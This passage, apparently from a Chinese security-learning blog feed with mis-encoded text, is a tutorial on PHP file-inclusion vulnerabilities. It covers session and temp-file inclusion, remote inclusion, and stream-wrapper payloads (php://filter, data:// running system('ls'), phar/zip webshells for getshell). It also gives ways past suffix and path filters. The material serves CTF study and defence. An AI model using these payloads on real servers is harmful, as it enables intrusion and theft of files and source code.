¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥</li><li>æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§ï¼Œæˆ–è€…å†…å®¹æ ¼å¼ã€‚</li></ul><h4 id="3-åŒ…å«sessionæ–‡ä»¶"><a href="#3-åŒ…å«sessionæ–‡ä»¶" class="headerlink" title="3.åŒ…å«sessionæ–‡ä»¶"></a>3.åŒ…å«sessionæ–‡ä»¶</h4><p>å¯ä»¥æ ¹æ®å°è¯•åŒ…å«åˆ°sessionæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>æ‰¾åˆ°sessionå†…çš„å¯æ§å˜é‡</li><li>sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„</li></ul><p>phpçš„sessionæ–‡ä»¶ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p><p>sessionå¸¸è§å­˜å‚¨è·¯å¾„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows:(phpstudyå®‰è£…çš„phpç¯å¢ƒä¸‹ï¼Œsessionå­˜å‚¨è·¯å¾„)</span><br><span class="line">D:\phpstudy_pro\Extensions\tmp\tmp</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230804222350447.png" alt="image-20230804222350447"></p><h4 id="4-åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#4-åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="4.åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>4.åŒ…å«ä¸´æ—¶æ–‡ä»¶</h4><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230804225803750.png" alt="image-20230804225803750"></p><p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\windows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç«äº‰çš„æ–¹å¼åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</h3><p>å¦‚æœphpçš„é…ç½®é€‰é¡¹<code>allow_url_includeã€allow_url_fopen</code>çŠ¶æ€ä¸º**<code>on</code>**çš„è¯ï¼Œåˆ™<code>include/require</code>å‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºè¿œç¨‹åŒ…å«æ–‡ä»¶(RFI)</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phptest/b.php?id=http://ip/æ–‡ä»¶è·¯å¾„</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè¿œç¨‹åŒ…å«çš„è·¯å¾„å¿…é¡»æ˜¯<code>ç»å¯¹è·¯å¾„</code></p><h2 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h2><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230803154537187.png" alt="image-20230803154537187"></p><h3 id="1-php-åè®®"><a href="#1-php-åè®®" class="headerlink" title="1.php://åè®®"></a>1.php://åè®®</h3><p><strong>(æ­¤åè®®ä¸»è¦ç”¨äºè¯»å–phpæºä»£ç æ—¶ä¼šç”¨åˆ°)</strong></p><ul><li>æ¡ä»¶ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:ä»…php://input php://stdin php://memory php://temp éœ€è¦on</span><br></pre></td></tr></table></figure><ul><li><p>ä½œç”¨ï¼š<br><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p></li><li><p>è¯´æ˜</p><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p></li></ul><h3 id="2-php-filterä¼ªåè®®"><a href="#2-php-filterä¼ªåè®®" class="headerlink" title="2.php://filterä¼ªåè®®"></a>2.php://filterä¼ªåè®®</h3><ul><li><p>æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line"></span><br><span class="line">allow_url_include=off</span><br></pre></td></tr></table></figure><p>åªæ˜¯è¯»å–ï¼Œéœ€è¦å¼€å¯allow_url_fopen,ä¸éœ€è¦å¼€å¯allow_url_include</p></li><li><p>è¯´æ˜</p><p>å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™</p><p>1.è¾“å‡ºè¿›è¡Œ<code>base64</code>åŠ å¯†åçš„ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://116.196.70.105/bisai/5/index.php?txt=php://filter/convert.base64-encode/resource=hello hsjctf </span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=xx.php</span><br></pre></td></tr></table></figure><p>2.è·å¾—å°†base64åŠ å¯†åçš„ä¿¡æ¯åï¼Œå†å°†å…¶è§£å¯†ï¼Œå¾—å‡ºåŸä¿¡æ¯</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805162835581.png" alt="image-20230805162835581"></p></li></ul><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805162956983.png" alt="image-20230805162956983"></p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805163658503.png" alt="image-20230805163658503"></p><h3 id="3-php-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"><a href="#3-php-inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰" class="headerlink" title="3.php://inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰"></a>3.php://inputï¼ˆè¯»å–POSTæ•°æ®ï¼‰</h3><ul><li> æ¡ä»¶</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/off</span><br><span class="line"></span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure><ul><li><p>è¯´æ˜</p><p>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å³å¯ä»¥ç›´æ¥è¯»å–åˆ°POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚</p><p><code>enctype=â€œmultipart/form-dataâ€</code>çš„æ—¶å€™php://inputæ˜¯<code>æ— æ•ˆ</code>çš„</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805161936827.png" alt="image-20230805161936827"></p></li></ul><h3 id="4-file-ä¼ªåè®®-è¯»å–æ–‡ä»¶å†…å®¹"><a href="#4-file-ä¼ªåè®®-è¯»å–æ–‡ä»¶å†…å®¹" class="headerlink" title="4.file://ä¼ªåè®®(è¯»å–æ–‡ä»¶å†…å®¹)"></a>4.file://ä¼ªåè®®(è¯»å–æ–‡ä»¶å†…å®¹)</h3><ul><li><p>æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/off</span><br><span class="line">allow_url_include=on/off  (å‡ä¸æ”¶å½±å“)</span><br></pre></td></tr></table></figure><p>æ‰“ctfä¸­å¸¸ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=file://C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805094807948.png" alt="image-20230805094807948"></p></li></ul><blockquote><p><code>è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„</code></p><p>åœ¨æ–‡ä»¶åŒ…å«ä¸­ï¼Œä½¿ç”¨file://ä¼ªåè®®æ—¶ï¼Œè·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œåœ¨Linuxç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œå¯ä»¥ä½¿ç”¨<code>?file=file:///etc/passwd</code>æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚åœ¨Windowsç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œå¯ä»¥ä½¿ç”¨<code>?file=file:///C:\\DVWA-master\\vulnerabilities\\fi\\1.txt</code>æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚</p></blockquote><h3 id="5-phar-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹"><a href="#5-phar-ä¼ªåè®®-è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹" class="headerlink" title="5.phar://ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)"></a>5.phar://ä¼ªåè®®(è¯»å–å‹ç¼©åŒ…æ–‡ä»¶å†…å®¹)</h3><ul><li><p>æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on/off</span><br><span class="line">allow_url_include:on/off(å‡ä¸å—å½±å“)</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š</p><p>php ç‰ˆæœ¬å¤§äºç­‰äº<code>5.3.0</code>ï¼Œå‹ç¼©åŒ…éœ€è¦æ˜¯<code>zip</code>åè®®å‹ç¼©ï¼Œ<code>rar</code>ä¸è¡Œï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹ä¸ºå…¶ä»–ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚</p></li><li><p>æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://å‹ç¼©åŒ…å/å†…éƒ¨æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phar://x.zip/x.php</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805165447995.png" alt="image-20230805165447995"></p><h4 id="å‹ç¼©åŒ…æœ¨é©¬getshell"><a href="#å‹ç¼©åŒ…æœ¨é©¬getshell" class="headerlink" title="å‹ç¼©åŒ…æœ¨é©¬getshell"></a>å‹ç¼©åŒ…æœ¨é©¬getshell</h4><p>è¿æ¥html.zipå‹ç¼©åŒ…ä¸­çš„muma.phpæ–‡ä»¶ï¼Œåˆ©ç”¨muma.phpæ–‡ä»¶ä¸­çš„ä¸€å¥è¯æœ¨é©¬æ‹¿åˆ°getshell</p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805165956230.png" alt="image-20230805165956230" style="zoom:80%;"><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805170308883.png" alt="image-20230805170308883" style="zoom: 80%;"><h3 id="6-zip-ä¼ªåè®®"><a href="#6-zip-ä¼ªåè®®" class="headerlink" title="6.zip://ä¼ªåè®®"></a>6.zip://ä¼ªåè®®</h3><p>zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼ï¼Œä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·(urlä¸åŒ)</p><ul><li><p>æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen:on/off</span><br><span class="line">allow_url_include:on/off(å‡ä¸å—å½±å“)</span><br></pre></td></tr></table></figure></li><li><p>æ ¼å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</span><br></pre></td></tr></table></figure><blockquote><p>urlä¸­å•çº¯è¾“å…¥#å·ï¼Œä¸ä¼šè¢«è§£æï¼Œæ¢æˆ%23æ‰èƒ½å¯ä»¥è¢«è§£æã€‚</p><p>åœ¨URLä¸­ï¼Œ<code>#</code>å·ç”¨äºæŒ‡å®šä¹¦ç­¾ï¼Œå®ƒä»£è¡¨ç½‘é¡µä¸­çš„ä¸€ä¸ªä½ç½®ã€‚å¦‚æœæ‚¨æƒ³åœ¨URLå‚æ•°ä¸­ä½¿ç”¨<code>#</code>å·ï¼Œæ‚¨éœ€è¦å°†å…¶æ›¿æ¢ä¸º<code>%23</code>ã€‚è¿™æ ·ï¼ŒæœåŠ¡å™¨æ‰èƒ½æ­£ç¡®è§£æå®ƒã€‚</p></blockquote><p>ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://D:\phpstudy\WWW\x.zip%23shell.php       #-&gt;%23</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805171114728.png" alt="image-20230805171114728"></p><h3 id="7-data-ä¼ªåè®®-è¯»å–æ–‡ä»¶"><a href="#7-data-ä¼ªåè®®-è¯»å–æ–‡ä»¶" class="headerlink" title="7.data://ä¼ªåè®®(è¯»å–æ–‡ä»¶)"></a>7.data://ä¼ªåè®®(è¯»å–æ–‡ä»¶)</h3><p>ï¼ˆå¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼‰<br>å’Œ<code>php://input</code>å¾ˆåƒï¼Œ<code>php://input</code>ä»¥<code>post</code>æäº¤æ•°æ®é‚£æ ·æäº¤æ•°æ®ï¼Œ<br><code>data://</code>æ˜¯ä»¥<code>get</code>æ–¹å¼æäº¤æ•°æ®ï¼Œä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œæäº¤çš„è„šæœ¬</p><ul><li><p>æ ¼å¼</p><blockquote><p><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code><br>å¦‚æœå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥<br>data://text/plain;base64,base64åŠ å¯†çš„ä»£ç <br>å¯é…åˆphpå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå®ç°å¯¹ä¸€äº›æ•°æ®çš„è·å–<br>å¦‚:<code>&lt;?php system(&quot;ls&quot;)?&gt;</code>ç»•è¿‡<br><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</code></p></blockquote></li></ul><p><code>data://text/plain,&lt;?php phpinfo()?&gt;</code></p><p>text/plain,å°±æ˜¯content-Typeï¼ŒæŒ‡ä»£GETæäº¤æ•°æ®çš„ç±»å‹</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805200048688.png" alt="image-20230805200048688"></p><blockquote><p><code>data://</code> æ˜¯ä¸€ç§ä¼ªåè®®ï¼Œå®ƒå…è®¸ä½ å°†æ•°æ®åµŒå…¥åˆ° URL ä¸­ã€‚åœ¨ä½ æåˆ°çš„ä¾‹å­ä¸­ï¼Œ<code>data://image/gif,&lt;?php phpinfo()?&gt;</code>ï¼Œ<code>image/gif</code> æ˜¯æ•°æ®çš„ MIME ç±»å‹ï¼Œå®ƒæŒ‡å®šäº†æ•°æ®çš„æ ¼å¼ã€‚ä½†æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒMIME ç±»å‹å¹¶ä¸å½±å“ PHP ä»£ç çš„æ‰§è¡Œã€‚</p><p>å½“ PHP è§£æå™¨é‡åˆ° <code>include</code> æˆ– <code>require</code> è¯­å¥æ—¶ï¼Œå®ƒä¼šè¯»å–æŒ‡å®šæ–‡ä»¶çš„å†…å®¹å¹¶æ‰§è¡Œå…¶ä¸­çš„ PHP ä»£ç ã€‚å¦‚æœä½ ä½¿ç”¨ <code>data://</code> ä¼ªåè®®æ¥åŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒPHP è§£æå™¨ä¼šå°†è¯¥å­—ç¬¦ä¸²è§†ä¸ºæ–‡ä»¶å†…å®¹å¹¶æ‰§è¡Œå…¶ä¸­çš„ PHP ä»£ç ã€‚å› æ­¤ï¼Œåœ¨ä½ æåˆ°çš„ä¾‹å­ä¸­ï¼Œå°½ç®¡ MIME ç±»å‹æŒ‡å®šä¸º <code>image/gif</code>ï¼Œä½† PHP è§£æå™¨ä»ç„¶ä¼šæ‰§è¡Œ <code>&lt;?php phpinfo()?&gt;</code> ä¸­çš„ PHP ä»£ç ã€‚æ€»ä¹‹ï¼ŒMIME ç±»å‹åªæ˜¯ç”¨æ¥æŒ‡å®šæ•°æ®æ ¼å¼çš„ï¼Œå¹¶ä¸å½±å“ PHP ä»£ç çš„æ‰§è¡Œã€‚å½“ä½ ä½¿ç”¨ <code>data://</code> ä¼ªåè®®æ¥åŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²æ—¶ï¼ŒPHP è§£æå™¨ä¼šå¿½ç•¥ MIME ç±»å‹å¹¶æ‰§è¡Œå…¶ä¸­çš„ PHP ä»£ç .</p></blockquote><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="1-è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€"><a href="#1-è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€" class="headerlink" title="1.è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€"></a>1.è·¯å¾„é•¿åº¦ç»•è¿‡åç¼€</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;123&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>.<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœé™åˆ¶äº†æ–‡ä»¶ç±»å‹ï¼Œæ¯”å¦‚è¿™é‡Œåªèƒ½åŒ…å«<code>html</code>åç¼€çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•ã€‚</p><p><code>æ“ä½œç³»ç»Ÿå­˜åœ¨çš„æœ€å¤§è·¯å¾„é•¿åº¦çš„é™åˆ¶</code></p><blockquote><p>windowsç³»ç»Ÿï¼Œæ–‡ä»¶åæœ€é•¿256ä¸ªå­—ç¬¦</p><p>linuxç³»ç»Ÿï¼Œæ–‡ä»¶åé•¿4096ä¸ªå­—ç¬¦ï¼ˆæµè§ˆå™¨æœ€å¤šåªèƒ½è¾“å…¥300å¤šä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦æŠ“åŒ…ï¼‰</p><p>å‰é¢åŠ ././././â€¦â€¦..xx.php</p><p>å¯ä»¥è¾“å…¥è¶…è¿‡æœ€å¤§è·¯å¾„é•¿åº¦çš„ç›®å½•ï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šå°†åé¢çš„è·¯å¾„ä¸¢å¼ƒï¼Œ<code>å¯¼è‡´æ‰©å±•åè¢«ä¸­é€”æˆªæ–­</code></p><p>info.phpâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.html</p><p><code>.</code>è¶…è¿‡256ä¸ªå°±è¡Œï¼Œåé¢å¤šå‡ºæ¥çš„<code>...........................................html</code>ä¸ä¼šè¢«è¯†åˆ«åˆ°</p></blockquote><h3 id="2-æˆªæ–­åç¼€"><a href="#2-æˆªæ–­åç¼€" class="headerlink" title="2.?æˆªæ–­åç¼€"></a>2.?æˆªæ–­åç¼€</h3><p>å¾€å¾€æ–‡ä»¶åŒ…å«ä¸­ä¼šå‡ºç°</p><blockquote><p>(â€œ$fileâ€.â€.htmlâ€)</p><p>è¿™é‡Œä»¥htmlä¸ºä¾‹å­ï¼Œè¿™æ ·æˆ‘ä»¬è¾“å…¥çš„æ–‡ä»¶åç§°å‚æ•°åé¢ç»ˆä¼šè·Ÿä¸Š.htmlåç¼€ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«å¤±è´¥</p><p>è¦æˆªæ–­åç¼€ï¼Œåªéœ€è¦åœ¨æœ«å°¾æ·»åŠ  <code>?</code> å³å¯ï¼Œè¿™æ ·åç¼€å°±ä¼šå˜æˆ URL çš„å‚æ•°</p></blockquote><h3 id="3-ç‚¹è¿‡æ»¤ï¼Œç½‘å€-ipæ— æ³•è¾“å…¥"><a href="#3-ç‚¹è¿‡æ»¤ï¼Œç½‘å€-ipæ— æ³•è¾“å…¥" class="headerlink" title="3. .ç‚¹è¿‡æ»¤ï¼Œç½‘å€/ipæ— æ³•è¾“å…¥"></a>3. .ç‚¹è¿‡æ»¤ï¼Œç½‘å€/ipæ— æ³•è¾“å…¥</h3><p>ipè½¬é•¿æ•´å‹ï¼Œé‡Œé¢æœ‰ä¸€å¥è¯æœ¨é©¬ï¼Œéœ€è¦vps</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bejson.com/convert/ip2int/</span><br></pre></td></tr></table></figure><p>å¦‚å°†IPåœ°å€219.239.110.138è½¬æ¢ä¸ºæ•°å­—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">219 * 256^3 + 239 * 256^2 + 110 * 256^1 + 138 * 256^0 = 3689901706</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œ219.239.110.138çš„æ•°å­—åœ°å€ä¸º3689901706ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &quot;http://3689901706&quot;;</span><br></pre></td></tr></table></figure><h3 id="4-è¢«è¿‡æ»¤"><a href="#4-è¢«è¿‡æ»¤" class="headerlink" title="4. ;è¢«è¿‡æ»¤"></a>4. ;è¢«è¿‡æ»¤</h3><p>?&gt;é—­åˆä»£ç </p><p>å› ä¸º?&gt;å¯ä»¥æ›¿ä»£phpä»£ç ä¸­æœ€åä¸€ä¸ªåˆ†å·çš„ä½œç”¨</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230805150200146.png" alt="image-20230805150200146"></p><h3 id="5-å¼ºåˆ¶åŠ åç¼€"><a href="#5-å¼ºåˆ¶åŠ åç¼€" class="headerlink" title="5.å¼ºåˆ¶åŠ åç¼€"></a>5.å¼ºåˆ¶åŠ åç¼€</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚ <span class="keyword">include</span>(<span class="variable">$cmd</span>.<span class="string">&quot;.php&quot;</span>)</span><br><span class="line"><span class="variable">$cmd</span>=data:<span class="comment">//text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="comment">// åé¢å†æ‹¼æ¥ä¸Š.phpçš„æ—¶å€™ï¼Œç”±äºphpè¯­å¥å·²ç»é—­åˆï¼Œæ‰€ä»¥èµ·ä¸äº†ä»€ä¹ˆä½œç”¨</span></span><br></pre></td></tr></table></figure><h3 id="6-è·¯å¾„è¿‡æ»¤"><a href="#6-è·¯å¾„è¿‡æ»¤" class="headerlink" title="6.è·¯å¾„è¿‡æ»¤"></a>6.è·¯å¾„è¿‡æ»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚replace(&#x27;./&#x27;,&#x27;&#x27;) ==&gt;</span><br><span class="line">å¯ä»¥ç”¨ ...//...//...//...//...//flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxeé¶åœº</title>
      <link href="/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/07/21/webgoat(xxe)%E9%9D%B6%E5%9C%BA/</url>
      
